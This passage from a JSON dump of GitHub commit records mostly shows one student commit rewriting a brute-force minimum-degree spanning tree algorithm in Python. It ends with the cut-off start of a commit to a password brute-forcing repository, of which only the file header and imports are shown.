starting positions of the pattern in the text\n    return positions"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/SMU-CS202\/Final-Project":{"893260d28a6eb6ec2763224a480d6874f53d0a02":{"url":"https:\/\/api.github.com\/repos\/SMU-CS202\/Final-Project\/commits\/893260d28a6eb6ec2763224a480d6874f53d0a02","html_url":"https:\/\/github.com\/SMU-CS202\/Final-Project\/commit\/893260d28a6eb6ec2763224a480d6874f53d0a02","message":"Update brute_force.py","sha":"893260d28a6eb6ec2763224a480d6874f53d0a02","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex d6762d1..04abb34 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,87 +1,153 @@\n-import itertools\r\n+from itertools import chain, combinations\r\n \r\n-class Graph:\r\n-    def __init__(self, V):\r\n-        self.V = V\r\n-        self.adj = [[] for i in range(V)]\r\n-    \r\n-    def add_edge(self, u, v, w):\r\n-        self.adj[u].append((v, w))\r\n-        self.adj[v].append((u, w))\r\n-\r\n-def mdst(graph):\r\n-    # Initialize minimum degree spanning tree with empty edges\r\n-    mdst = Graph(graph.V)\r\n-\r\n-    # Loop through all possible subgraphs\r\n-    for subgraph in itertools.combinations(range(graph.V), graph.V \/\/ 2):\r\n-        # Create a copy of the graph and remove the vertices not in the subgraph\r\n-        subgraph_graph = Graph(graph.V)\r\n-        for u in subgraph:\r\n-            for v, w in graph.adj[u]:\r\n-                if v in subgraph:\r\n-                    subgraph_graph.add_edge(u, v, w)\r\n-\r\n-        # Calculate the degree of each vertex in the subgraph\r\n-        degrees = [0] * subgraph_graph.V\r\n-        for u in subgraph:\r\n-            for v, _ in subgraph_graph.adj[u]:\r\n-                degrees[u] += 1\r\n-                degrees[v] += 1\r\n-\r\n-        # If the subgraph is connected and has the minimum degree, add its edges to the MDST\r\n-        if all(degrees[u] >= 2 for u in subgraph) and subgraph_graph.V % 2 == 0:\r\n-            for u in subgraph:\r\n-                for v, w in subgraph_graph.adj[u]:\r\n-                    if v > u:\r\n-                        mdst.add_edge(u, v, w)\r\n+def powerset(iterable):\r\n+    s = list(iterable)\r\n+    return list(chain.from_iterable(combinations(s, r) for r in range(len(s)+1)))\r\n+\r\n+def get_degree(graph):\r\n+    deg = -float('inf')\r\n+    for v in graph:\r\n+        deg = max(deg, len(v))\r\n+    return deg\r\n+\r\n+def get_smallest_degree(subgraphs):\r\n+    min_degree = float('inf')\r\n+    mdst = \"\"\r\n+    for subgraph in subgraphs:\r\n+        if (get_degree(subgraph) < min_degree):\r\n+            mdst = subgraph\r\n+            min_degree = get_degree(subgraph)\r\n     return mdst\r\n \r\n-# Test case 1\r\n-g1 = Graph(5)\r\n-g1.add_edge(0, 1, 2)\r\n-g1.add_edge(0, 2, 1)\r\n-g1.add_edge(0, 3, 4)\r\n-g1.add_edge(1, 2, 3)\r\n-g1.add_edge(1, 4, 5)\r\n-g1.add_edge(2, 3, 6)\r\n-g1.add_edge(3, 4, 7)\r\n-\r\n-mdst1 = mdst(g1)\r\n-for u in range(mdst1.V):\r\n-    for v, w in mdst1.adj[u]:\r\n-        if v > u:\r\n-            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 1  (1, 2): 3  (0, 1): 2  (1, 4): 5\r\n-\r\n-# Test case 2\r\n-g2 = Graph(6)\r\n-g2.add_edge(0, 1, 1)\r\n-g2.add_edge(0, 2, 2)\r\n-g2.add_edge(1, 2, 3)\r\n-g2.add_edge(1, 3, 4)\r\n-g2.add_edge(2, 3, 5)\r\n-g2.add_edge(2, 4, 6)\r\n-g2.add_edge(3, 4, 7)\r\n-g2.add_edge(3, 5, 8)\r\n-g2.add_edge(4, 5, 9)\r\n-\r\n-mdst2 = mdst(g2)\r\n-for u in range(mdst2.V):\r\n-    for v, w in mdst2.adj[u]:\r\n-        if v > u:\r\n-            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 1): 1  (2, 4): 6  (3, 4): 7  (1, 3): 4\r\n-\r\n-# Test case 3\r\n-g3 = Graph(4)\r\n-g3.add_edge(0, 1, 1)\r\n-g3.add_edge(0, 2, 2)\r\n-g3.add_edge(0, 3, 3)\r\n-g3.add_edge(1, 2, 4)\r\n-g3.add_edge(1, 3, 5)\r\n-g3.add_edge(2, 3, 6)\r\n-\r\n-mdst3 = mdst(g3)\r\n-for u in range(mdst3.V):\r\n-    for v, w in mdst3.adj[u]:\r\n-        if v > u:\r\n-            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 2  (0, 1): 1  (1, 3): 5\r\n+def get_edges(adj_list):\r\n+    edges = []\r\n+    for key in adj_list.keys():\r\n+        for v in adj_list.get(key):\r\n+            if(v > key):\r\n+                edges.append([key, v])\r\n+    return edges\r\n+\r\n+def checkIfVertexInSet(vertex, vertice_set):\r\n+    found = False\r\n+    for v in vertice_set:\r\n+        if (vertex == v):\r\n+            found = True\r\n+    return found\r\n+\r\n+def checkIfEdgeVerticesInSet(edge, Vset):\r\n+    u_found = checkIfVertexInSet(edge[0], Vset)\r\n+    v_found = checkIfVertexInSet(edge[1], Vset)\r\n+    if (v_found and u_found):\r\n+        return True\r\n+    return False\r\n+\r\n+def convert_edgelist_to_adj(edges, num_nodes):\r\n+    adj_matrix = [ [0] * num_nodes for i in range(num_nodes)]\r\n+    for edge in edges:\r\n+        i = edge[0]\r\n+        j = edge[1]\r\n+        adj_matrix[i][j] = 1\r\n+        adj_matrix[j][i] = 1\r\n+    adj_list = {}\r\n+    # Now build the adjacency list\r\n+    # First add keys\r\n+    for i in range(num_nodes):\r\n+        adj_list[i] = []\r\n+    \r\n+    # Add neighbours for each node\r\n+    for i in range(num_nodes):\r\n+        for j in range(num_nodes):\r\n+            if (adj_matrix[i][j] == 1):\r\n+                adj_list[i].append(j)\r\n+    return adj_list\r\n+\r\n+def DFS(source, adj_list, visited_arr):\r\n+        # Mark the vertex visited\r\n+        visited_arr[source] = True\r\n+\r\n+        # Visit the the neighbors\r\n+        for i in range(len(adj_list[source])):\r\n+            neighbour = adj_list[source][i]\r\n+            if(visited_arr[neighbour] == False):\r\n+                # Make recursive call from neighbor\r\n+                DFS(neighbour, adj_list, visited_arr)\r\n+\r\n+def check_if_connected(adj_list):\r\n+        num_vertices = len(adj_list.keys())\r\n+\r\n+        # Create array to store visited nodes\r\n+        visited = [False] * num_vertices\r\n+\r\n+        # Begin the DFS from vertex 0\r\n+        DFS(0, adj_list, visited)\r\n+\r\n+        # Check if all the vertices are visited, if yes then graph is connected\r\n+        count = 0\r\n+        for i in range(len(visited)):\r\n+            if(visited[i]):\r\n+                count += 1\r\n+        if(num_vertices == count):\r\n+            print(\"Given graph is connected\")\r\n+            print(adj_list)\r\n+            return True\r\n+        else:\r\n+            print(\"Given graph is not connected\")\r\n+            return False\r\n+\r\n+def generate_subgraphs(adj_list):\r\n+    powerV = powerset(adj_list.keys()) # generate all possible vertice permutations\r\n+    powerE = powerset(get_edges(adj_list)) # generate all possible edge permutations\r\n+    subgraphs = []\r\n+    for V in powerV:\r\n+        for E in powerE:\r\n+            accept = True\r\n+            for edge in E:\r\n+                if(checkIfEdgeVerticesInSet(edge, V) == False):\r\n+                    accept = False\r\n+            if (accept):\r\n+                subgraphs.append([V, E])\r\n+    return subgraphs\r\n+\r\n+def check_if_vertex_in_edge(vertex, edge):\r\n+    if (vertex == edge[0] or vertex == edge[1]):\r\n+        return True\r\n+    return False\r\n+\r\n+def check_if_spanning(subgraph, adj_list):\r\n+    subgraph_edges = subgraph[1]\r\n+    vertices = adj_list.keys() # get all vertices in the graph\r\n+    record_vertex_present = [False] * len(vertices) # keep track of the presence of each vertex in the graph\r\n+\r\n+    for edge in subgraph_edges:\r\n+        record_vertex_present[edge[0]] = True\r\n+        record_vertex_present[edge[1]] = True\r\n+    \r\n+    for i in range(len(record_vertex_present)):\r\n+        if (record_vertex_present[i] == False):\r\n+            return False\r\n+    subgraph_to_adj = convert_edgelist_to_adj(subgraph_edges, len(vertices))\r\n+    if (check_if_connected(subgraph_to_adj)):\r\n+        return True\r\n+    return False\r\n+\r\n+def get_all_spanning_trees(subgraphs, adj_list):\r\n+    spanning_trees = []\r\n+    for subgraph in subgraphs:\r\n+        if (check_if_spanning(subgraph, adj_list)):\r\n+            spanning_trees.append(subgraph)\r\n+    return spanning_trees\r\n+\r\n+graph1 = {\r\n+    0: [1],\r\n+    1: [0, 2, 3],\r\n+    2: [1],\r\n+    3: [1, 4],\r\n+    4: [3]\r\n+}\r\n+\r\n+def minimum_degree_spanning_tree(graph):\r\n+    vertices = graph.keys() # get all verticees\r\n+    all_valid_subgraphs = generate_subgraphs(graph)\r\n+    spanning_trees = get_all_spanning_trees(all_valid_subgraphs, graph)\r\n+    mdst = get_smallest_degree(spanning_trees)\r\n+    print(mdst)\r\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n-import itertools\r\n+from itertools import chain, combinations\r\n \r\n-class Graph:\r\n-    def __init__(self, V):\r\n-        self.V = V\r\n-        self.adj = [[] for i in range(V)]\r\n-    \r\n-    def add_edge(self, u, v, w):\r\n-        self.adj[u].append((v, w))\r\n-        self.adj[v].append((u, w))\r\n-\r\n-def mdst(graph):\r\n-    # Initialize minimum degree spanning tree with empty edges\r\n-    mdst = Graph(graph.V)\r\n-\r\n-    # Loop through all possible subgraphs\r\n-    for subgraph in itertools.combinations(range(graph.V), graph.V \/\/ 2):\r\n-        # Create a copy of the graph and remove the vertices not in the subgraph\r\n-        subgraph_graph = Graph(graph.V)\r\n-        for u in subgraph:\r\n-            for v, w in graph.adj[u]:\r\n-                if v in subgraph:\r\n-                    subgraph_graph.add_edge(u, v, w)\r\n-\r\n-        # Calculate the degree of each vertex in the subgraph\r\n-        degrees = [0] * subgraph_graph.V\r\n-        for u in subgraph:\r\n-            for v, _ in subgraph_graph.adj[u]:\r\n-                degrees[u] += 1\r\n-                degrees[v] += 1\r\n-\r\n-        # If the subgraph is connected and has the minimum degree, add its edges to the MDST\r\n-        if all(degrees[u] >= 2 for u in subgraph) and subgraph_graph.V % 2 == 0:\r\n-            for u in subgraph:\r\n-                for v, w in subgraph_graph.adj[u]:\r\n-                    if v > u:\r\n-                        mdst.add_edge(u, v, w)\r\n+def powerset(iterable):\r\n+    s = list(iterable)\r\n+    return list(chain.from_iterable(combinations(s, r) for r in range(len(s)+1)))\r\n+\r\n+def get_degree(graph):\r\n+    deg = -float('inf')\r\n+    for v in graph:\r\n+        deg = max(deg, len(v))\r\n+    return deg\r\n+\r\n+def get_smallest_degree(subgraphs):\r\n+    min_degree = float('inf')\r\n+    mdst = \"\"\r\n+    for subgraph in subgraphs:\r\n+        if (get_degree(subgraph) < min_degree):\r\n+            mdst = subgraph\r\n+            min_degree = get_degree(subgraph)\r\n     return mdst\r\n \r\n-# Test case 1\r\n-g1 = Graph(5)\r\n-g1.add_edge(0, 1, 2)\r\n-g1.add_edge(0, 2, 1)\r\n-g1.add_edge(0, 3, 4)\r\n-g1.add_edge(1, 2, 3)\r\n-g1.add_edge(1, 4, 5)\r\n-g1.add_edge(2, 3, 6)\r\n-g1.add_edge(3, 4, 7)\r\n-\r\n-mdst1 = mdst(g1)\r\n-for u in range(mdst1.V):\r\n-    for v, w in mdst1.adj[u]:\r\n-        if v > u:\r\n-            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 1  (1, 2): 3  (0, 1): 2  (1, 4): 5\r\n-\r\n-# Test case 2\r\n-g2 = Graph(6)\r\n-g2.add_edge(0, 1, 1)\r\n-g2.add_edge(0, 2, 2)\r\n-g2.add_edge(1, 2, 3)\r\n-g2.add_edge(1, 3, 4)\r\n-g2.add_edge(2, 3, 5)\r\n-g2.add_edge(2, 4, 6)\r\n-g2.add_edge(3, 4, 7)\r\n-g2.add_edge(3, 5, 8)\r\n-g2.add_edge(4, 5, 9)\r\n-\r\n-mdst2 = mdst(g2)\r\n-for u in range(mdst2.V):\r\n-    for v, w in mdst2.adj[u]:\r\n-        if v > u:\r\n-            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 1): 1  (2, 4): 6  (3, 4): 7  (1, 3): 4\r\n-\r\n-# Test case 3\r\n-g3 = Graph(4)\r\n-g3.add_edge(0, 1, 1)\r\n-g3.add_edge(0, 2, 2)\r\n-g3.add_edge(0, 3, 3)\r\n-g3.add_edge(1, 2, 4)\r\n-g3.add_edge(1, 3, 5)\r\n-g3.add_edge(2, 3, 6)\r\n-\r\n-mdst3 = mdst(g3)\r\n-for u in range(mdst3.V):\r\n-    for v, w in mdst3.adj[u]:\r\n-        if v > u:\r\n-            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 2  (0, 1): 1  (1, 3): 5\r\n+def get_edges(adj_list):\r\n+    edges = []\r\n+    for key in adj_list.keys():\r\n+        for v in adj_list.get(key):\r\n+            if(v > key):\r\n+                edges.append([key, v])\r\n+    return edges\r\n+\r\n+def checkIfVertexInSet(vertex, vertice_set):\r\n+    found = False\r\n+    for v in vertice_set:\r\n+        if (vertex == v):\r\n+            found = True\r\n+    return found\r\n+\r\n+def checkIfEdgeVerticesInSet(edge, Vset):\r\n+    u_found = checkIfVertexInSet(edge[0], Vset)\r\n+    v_found = checkIfVertexInSet(edge[1], Vset)\r\n+    if (v_found and u_found):\r\n+        return True\r\n+    return False\r\n+\r\n+def convert_edgelist_to_adj(edges, num_nodes):\r\n+    adj_matrix = [ [0] * num_nodes for i in range(num_nodes)]\r\n+    for edge in edges:\r\n+        i = edge[0]\r\n+        j = edge[1]\r\n+        adj_matrix[i][j] = 1\r\n+        adj_matrix[j][i] = 1\r\n+    adj_list = {}\r\n+    # Now build the adjacency list\r\n+    # First add keys\r\n+    for i in range(num_nodes):\r\n+        adj_list[i] = []\r\n+    \r\n+    # Add neighbours for each node\r\n+    for i in range(num_nodes):\r\n+        for j in range(num_nodes):\r\n+            if (adj_matrix[i][j] == 1):\r\n+                adj_list[i].append(j)\r\n+    return adj_list\r\n+\r\n+def DFS(source, adj_list, visited_arr):\r\n+        # Mark the vertex visited\r\n+        visited_arr[source] = True\r\n+\r\n+        # Visit the the neighbors\r\n+        for i in range(len(adj_list[source])):\r\n+            neighbour = adj_list[source][i]\r\n+            if(visited_arr[neighbour] == False):\r\n+                # Make recursive call from neighbor\r\n+                DFS(neighbour, adj_list, visited_arr)\r\n+\r\n+def check_if_connected(adj_list):\r\n+        num_vertices = len(adj_list.keys())\r\n+\r\n+        # Create array to store visited nodes\r\n+        visited = [False] * num_vertices\r\n+\r\n+        # Begin the DFS from vertex 0\r\n+        DFS(0, adj_list, visited)\r\n+\r\n+        # Check if all the vertices are visited, if yes then graph is connected\r\n+        count = 0\r\n+        for i in range(len(visited)):\r\n+            if(visited[i]):\r\n+                count += 1\r\n+        if(num_vertices == count):\r\n+            print(\"Given graph is connected\")\r\n+            print(adj_list)\r\n+            return True\r\n+        else:\r\n+            print(\"Given graph is not connected\")\r\n+            return False\r\n+\r\n+def generate_subgraphs(adj_list):\r\n+    powerV = powerset(adj_list.keys()) # generate all possible vertice permutations\r\n+    powerE = powerset(get_edges(adj_list)) # generate all possible edge permutations\r\n+    subgraphs = []\r\n+    for V in powerV:\r\n+        for E in powerE:\r\n+            accept = True\r\n+            for edge in E:\r\n+                if(checkIfEdgeVerticesInSet(edge, V) == False):\r\n+                    accept = False\r\n+            if (accept):\r\n+                subgraphs.append([V, E])\r\n+    return subgraphs\r\n+\r\n+def check_if_vertex_in_edge(vertex, edge):\r\n+    if (vertex == edge[0] or vertex == edge[1]):\r\n+        return True\r\n+    return False\r\n+\r\n+def check_if_spanning(subgraph, adj_list):\r\n+    subgraph_edges = subgraph[1]\r\n+    vertices = adj_list.keys() # get all vertices in the graph\r\n+    record_vertex_present = [False] * len(vertices) # keep track of the presence of each vertex in the graph\r\n+\r\n+    for edge in subgraph_edges:\r\n+        record_vertex_present[edge[0]] = True\r\n+        record_vertex_present[edge[1]] = True\r\n+    \r\n+    for i in range(len(record_vertex_present)):\r\n+        if (record_vertex_present[i] == False):\r\n+            return False\r\n+    subgraph_to_adj = convert_edgelist_to_adj(subgraph_edges, len(vertices))\r\n+    if (check_if_connected(subgraph_to_adj)):\r\n+        return True\r\n+    return False\r\n+\r\n+def get_all_spanning_trees(subgraphs, adj_list):\r\n+    spanning_trees = []\r\n+    for subgraph in subgraphs:\r\n+        if (check_if_spanning(subgraph, adj_list)):\r\n+            spanning_trees.append(subgraph)\r\n+    return spanning_trees\r\n+\r\n+graph1 = {\r\n+    0: [1],\r\n+    1: [0, 2, 3],\r\n+    2: [1],\r\n+    3: [1, 4],\r\n+    4: [3]\r\n+}\r\n+\r\n+def minimum_degree_spanning_tree(graph):\r\n+    vertices = graph.keys() # get all verticees\r\n+    all_valid_subgraphs = generate_subgraphs(graph)\r\n+    spanning_trees = get_all_spanning_trees(all_valid_subgraphs, graph)\r\n+    mdst = get_smallest_degree(spanning_trees)\r\n+    print(mdst)\r\n","add":150,"remove":84,"filename":"\/brute_force.py","badparts":["import itertools\r","class Graph:\r","    def __init__(self, V):\r","        self.V = V\r","        self.adj = [[] for i in range(V)]\r","    \r","    def add_edge(self, u, v, w):\r","        self.adj[u].append((v, w))\r","        self.adj[v].append((u, w))\r","\r","def mdst(graph):\r","    mdst = Graph(graph.V)\r","\r","    for subgraph in itertools.combinations(range(graph.V), graph.V \/\/ 2):\r","        subgraph_graph = Graph(graph.V)\r","        for u in subgraph:\r","            for v, w in graph.adj[u]:\r","                if v in subgraph:\r","                    subgraph_graph.add_edge(u, v, w)\r","\r","        degrees = [0] * subgraph_graph.V\r","        for u in subgraph:\r","            for v, _ in subgraph_graph.adj[u]:\r","                degrees[u] += 1\r","                degrees[v] += 1\r","\r","        if all(degrees[u] >= 2 for u in subgraph) and subgraph_graph.V % 2 == 0:\r","            for u in subgraph:\r","                for v, w in subgraph_graph.adj[u]:\r","                    if v > u:\r","                        mdst.add_edge(u, v, w)\r","g1 = Graph(5)\r","g1.add_edge(0, 1, 2)\r","g1.add_edge(0, 2, 1)\r","g1.add_edge(0, 3, 4)\r","g1.add_edge(1, 2, 3)\r","g1.add_edge(1, 4, 5)\r","g1.add_edge(2, 3, 6)\r","g1.add_edge(3, 4, 7)\r","\r","mdst1 = mdst(g1)\r","for u in range(mdst1.V):\r","    for v, w in mdst1.adj[u]:\r","        if v > u:\r","            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 1  (1, 2): 3  (0, 1): 2  (1, 4): 5\r","\r","g2 = Graph(6)\r","g2.add_edge(0, 1, 1)\r","g2.add_edge(0, 2, 2)\r","g2.add_edge(1, 2, 3)\r","g2.add_edge(1, 3, 4)\r","g2.add_edge(2, 3, 5)\r","g2.add_edge(2, 4, 6)\r","g2.add_edge(3, 4, 7)\r","g2.add_edge(3, 5, 8)\r","g2.add_edge(4, 5, 9)\r","\r","mdst2 = mdst(g2)\r","for u in range(mdst2.V):\r","    for v, w in mdst2.adj[u]:\r","        if v > u:\r","            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 1): 1  (2, 4): 6  (3, 4): 7  (1, 3): 4\r","\r","g3 = Graph(4)\r","g3.add_edge(0, 1, 1)\r","g3.add_edge(0, 2, 2)\r","g3.add_edge(0, 3, 3)\r","g3.add_edge(1, 2, 4)\r","g3.add_edge(1, 3, 5)\r","g3.add_edge(2, 3, 6)\r","\r","mdst3 = mdst(g3)\r","for u in range(mdst3.V):\r","    for v, w in mdst3.adj[u]:\r","        if v > u:\r","            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 2  (0, 1): 1  (1, 3): 5\r"],"goodparts":["from itertools import chain, combinations\r","def powerset(iterable):\r","    s = list(iterable)\r","    return list(chain.from_iterable(combinations(s, r) for r in range(len(s)+1)))\r","\r","def get_degree(graph):\r","    deg = -float('inf')\r","    for v in graph:\r","        deg = max(deg, len(v))\r","    return deg\r","\r","def get_smallest_degree(subgraphs):\r","    min_degree = float('inf')\r","    mdst = \"\"\r","    for subgraph in subgraphs:\r","        if (get_degree(subgraph) < min_degree):\r","            mdst = subgraph\r","            min_degree = get_degree(subgraph)\r","def get_edges(adj_list):\r","    edges = []\r","    for key in adj_list.keys():\r","        for v in adj_list.get(key):\r","            if(v > key):\r","                edges.append([key, v])\r","    return edges\r","\r","def checkIfVertexInSet(vertex, vertice_set):\r","    found = False\r","    for v in vertice_set:\r","        if (vertex == v):\r","            found = True\r","    return found\r","\r","def checkIfEdgeVerticesInSet(edge, Vset):\r","    u_found = checkIfVertexInSet(edge[0], Vset)\r","    v_found = checkIfVertexInSet(edge[1], Vset)\r","    if (v_found and u_found):\r","        return True\r","    return False\r","\r","def convert_edgelist_to_adj(edges, num_nodes):\r","    adj_matrix = [ [0] * num_nodes for i in range(num_nodes)]\r","    for edge in edges:\r","        i = edge[0]\r","        j = edge[1]\r","        adj_matrix[i][j] = 1\r","        adj_matrix[j][i] = 1\r","    adj_list = {}\r","    for i in range(num_nodes):\r","        adj_list[i] = []\r","    \r","    for i in range(num_nodes):\r","        for j in range(num_nodes):\r","            if (adj_matrix[i][j] == 1):\r","                adj_list[i].append(j)\r","    return adj_list\r","\r","def DFS(source, adj_list, visited_arr):\r","        visited_arr[source] = True\r","\r","        for i in range(len(adj_list[source])):\r","            neighbour = adj_list[source][i]\r","            if(visited_arr[neighbour] == False):\r","                DFS(neighbour, adj_list, visited_arr)\r","\r","def check_if_connected(adj_list):\r","        num_vertices = len(adj_list.keys())\r","\r","        visited = [False] * num_vertices\r","\r","        DFS(0, adj_list, visited)\r","\r","        count = 0\r","        for i in range(len(visited)):\r","            if(visited[i]):\r","                count += 1\r","        if(num_vertices == count):\r","            print(\"Given graph is connected\")\r","            print(adj_list)\r","            return True\r","        else:\r","            print(\"Given graph is not connected\")\r","            return False\r","\r","def generate_subgraphs(adj_list):\r","    powerV = powerset(adj_list.keys()) # generate all possible vertice permutations\r","    powerE = powerset(get_edges(adj_list)) # generate all possible edge permutations\r","    subgraphs = []\r","    for V in powerV:\r","        for E in powerE:\r","            accept = True\r","            for edge in E:\r","                if(checkIfEdgeVerticesInSet(edge, V) == False):\r","                    accept = False\r","            if (accept):\r","                subgraphs.append([V, E])\r","    return subgraphs\r","\r","def check_if_vertex_in_edge(vertex, edge):\r","    if (vertex == edge[0] or vertex == edge[1]):\r","        return True\r","    return False\r","\r","def check_if_spanning(subgraph, adj_list):\r","    subgraph_edges = subgraph[1]\r","    vertices = adj_list.keys() # get all vertices in the graph\r","    record_vertex_present = [False] * len(vertices) # keep track of the presence of each vertex in the graph\r","\r","    for edge in subgraph_edges:\r","        record_vertex_present[edge[0]] = True\r","        record_vertex_present[edge[1]] = True\r","    \r","    for i in range(len(record_vertex_present)):\r","        if (record_vertex_present[i] == False):\r","            return False\r","    subgraph_to_adj = convert_edgelist_to_adj(subgraph_edges, len(vertices))\r","    if (check_if_connected(subgraph_to_adj)):\r","        return True\r","    return False\r","\r","def get_all_spanning_trees(subgraphs, adj_list):\r","    spanning_trees = []\r","    for subgraph in subgraphs:\r","        if (check_if_spanning(subgraph, adj_list)):\r","            spanning_trees.append(subgraph)\r","    return spanning_trees\r","\r","graph1 = {\r","    0: [1],\r","    1: [0, 2, 3],\r","    2: [1],\r","    3: [1, 4],\r","    4: [3]\r","}\r","\r","def minimum_degree_spanning_tree(graph):\r","    vertices = graph.keys() # get all verticees\r","    all_valid_subgraphs = generate_subgraphs(graph)\r","    spanning_trees = get_all_spanning_trees(all_valid_subgraphs, graph)\r","    mdst = get_smallest_degree(spanning_trees)\r","    print(mdst)\r"]}],"source":"\nimport itertools\r \r class Graph:\r def __init__(self, V):\r self.V=V\r self.adj=[[] for i in range(V)]\r \r def add_edge(self, u, v, w):\r self.adj[u].append((v, w))\r self.adj[v].append((u, w))\r \r def mdst(graph):\r mdst=Graph(graph.V)\r \r for subgraph in itertools.combinations(range(graph.V), graph.V \/\/ 2):\r subgraph_graph=Graph(graph.V)\r for u in subgraph:\r for v, w in graph.adj[u]:\r if v in subgraph:\r subgraph_graph.add_edge(u, v, w)\r \r degrees=[0] * subgraph_graph.V\r for u in subgraph:\r for v, _ in subgraph_graph.adj[u]:\r degrees[u] +=1\r degrees[v] +=1\r \r if all(degrees[u] >=2 for u in subgraph) and subgraph_graph.V % 2==0:\r for u in subgraph:\r for v, w in subgraph_graph.adj[u]:\r if v > u:\r mdst.add_edge(u, v, w)\r return mdst\r \r g1=Graph(5)\r g1.add_edge(0, 1, 2)\r g1.add_edge(0, 2, 1)\r g1.add_edge(0, 3, 4)\r g1.add_edge(1, 2, 3)\r g1.add_edge(1, 4, 5)\r g1.add_edge(2, 3, 6)\r g1.add_edge(3, 4, 7)\r \r mdst1=mdst(g1)\r for u in range(mdst1.V):\r for v, w in mdst1.adj[u]:\r if v > u:\r print(f\"({u},{v}):{w}\") \r g2=Graph(6)\r g2.add_edge(0, 1, 1)\r g2.add_edge(0, 2, 2)\r g2.add_edge(1, 2, 3)\r g2.add_edge(1, 3, 4)\r g2.add_edge(2, 3, 5)\r g2.add_edge(2, 4, 6)\r g2.add_edge(3, 4, 7)\r g2.add_edge(3, 5, 8)\r g2.add_edge(4, 5, 9)\r \r mdst2=mdst(g2)\r for u in range(mdst2.V):\r for v, w in mdst2.adj[u]:\r if v > u:\r print(f\"({u},{v}):{w}\") \r g3=Graph(4)\r g3.add_edge(0, 1, 1)\r g3.add_edge(0, 2, 2)\r g3.add_edge(0, 3, 3)\r g3.add_edge(1, 2, 4)\r g3.add_edge(1, 3, 5)\r g3.add_edge(2, 3, 6)\r \r mdst3=mdst(g3)\r for u in range(mdst3.V):\r for v, w in mdst3.adj[u]:\r if v > u:\r print(f\"({u},{v}):{w}\") ","sourceWithComments":"import itertools\r\n\r\nclass Graph:\r\n    def __init__(self, V):\r\n        self.V = V\r\n        self.adj = [[] for i in range(V)]\r\n    \r\n    def add_edge(self, u, v, w):\r\n        self.adj[u].append((v, w))\r\n        self.adj[v].append((u, w))\r\n\r\ndef mdst(graph):\r\n    # Initialize minimum degree spanning tree with empty edges\r\n    mdst = Graph(graph.V)\r\n\r\n    # Loop through all possible subgraphs\r\n    for subgraph in itertools.combinations(range(graph.V), graph.V \/\/ 2):\r\n        # Create a copy of the graph and remove the vertices not in the subgraph\r\n        subgraph_graph = Graph(graph.V)\r\n        for u in subgraph:\r\n            for v, w in graph.adj[u]:\r\n                if v in subgraph:\r\n                    subgraph_graph.add_edge(u, v, w)\r\n\r\n        # Calculate the degree of each vertex in the subgraph\r\n        degrees = [0] * subgraph_graph.V\r\n        for u in subgraph:\r\n            for v, _ in subgraph_graph.adj[u]:\r\n                degrees[u] += 1\r\n                degrees[v] += 1\r\n\r\n        # If the subgraph is connected and has the minimum degree, add its edges to the MDST\r\n        if all(degrees[u] >= 2 for u in subgraph) and subgraph_graph.V % 2 == 0:\r\n            for u in subgraph:\r\n                for v, w in subgraph_graph.adj[u]:\r\n                    if v > u:\r\n                        mdst.add_edge(u, v, w)\r\n    return mdst\r\n\r\n# Test case 1\r\ng1 = Graph(5)\r\ng1.add_edge(0, 1, 2)\r\ng1.add_edge(0, 2, 1)\r\ng1.add_edge(0, 3, 4)\r\ng1.add_edge(1, 2, 3)\r\ng1.add_edge(1, 4, 5)\r\ng1.add_edge(2, 3, 6)\r\ng1.add_edge(3, 4, 7)\r\n\r\nmdst1 = mdst(g1)\r\nfor u in range(mdst1.V):\r\n    for v, w in mdst1.adj[u]:\r\n        if v > u:\r\n            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 1  (1, 2): 3  (0, 1): 2  (1, 4): 5\r\n\r\n# Test case 2\r\ng2 = Graph(6)\r\ng2.add_edge(0, 1, 1)\r\ng2.add_edge(0, 2, 2)\r\ng2.add_edge(1, 2, 3)\r\ng2.add_edge(1, 3, 4)\r\ng2.add_edge(2, 3, 5)\r\ng2.add_edge(2, 4, 6)\r\ng2.add_edge(3, 4, 7)\r\ng2.add_edge(3, 5, 8)\r\ng2.add_edge(4, 5, 9)\r\n\r\nmdst2 = mdst(g2)\r\nfor u in range(mdst2.V):\r\n    for v, w in mdst2.adj[u]:\r\n        if v > u:\r\n            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 1): 1  (2, 4): 6  (3, 4): 7  (1, 3): 4\r\n\r\n# Test case 3\r\ng3 = Graph(4)\r\ng3.add_edge(0, 1, 1)\r\ng3.add_edge(0, 2, 2)\r\ng3.add_edge(0, 3, 3)\r\ng3.add_edge(1, 2, 4)\r\ng3.add_edge(1, 3, 5)\r\ng3.add_edge(2, 3, 6)\r\n\r\nmdst3 = mdst(g3)\r\nfor u in range(mdst3.V):\r\n    for v, w in mdst3.adj[u]:\r\n        if v > u:\r\n            print(f\"({u}, {v}): {w}\")  # Expected output: (0, 2): 2  (0, 1): 1  (1, 3): 5\r\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/Thiago1alberto\/brute_force_password":{"f88b367eb4d241082edb8b55ea59ee382adfbad3":{"url":"https:\/\/api.github.com\/repos\/Thiago1alberto\/brute_force_password\/commits\/f88b367eb4d241082edb8b55ea59ee382adfbad3","html_url":"https:\/\/github.com\/Thiago1alberto\/brute_force_password\/commit\/f88b367eb4d241082edb8b55ea59ee382adfbad3","sha":"f88b367eb4d241082edb8b55ea59ee382adfbad3","keyword":"brute force update","diff":"diff --git a\/brute_force_password.py b\/brute_force_password.py\nindex 35f5385..0064db0 100644\n--- a\/brute_force_password.py\n+++ b\/brute_force_password.py\n@@ -1,18 +1,9 @@\n-import random\n import string\n import itertools\n+import concurrent.futures\n \n-\"\"\"\n-def generate_password(length=8):\n-    # Gera uma senha aleat\u00f3ria com letras min\u00fasculas, mai\u00fasculas e d\u00edgitos\n-    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits\n-    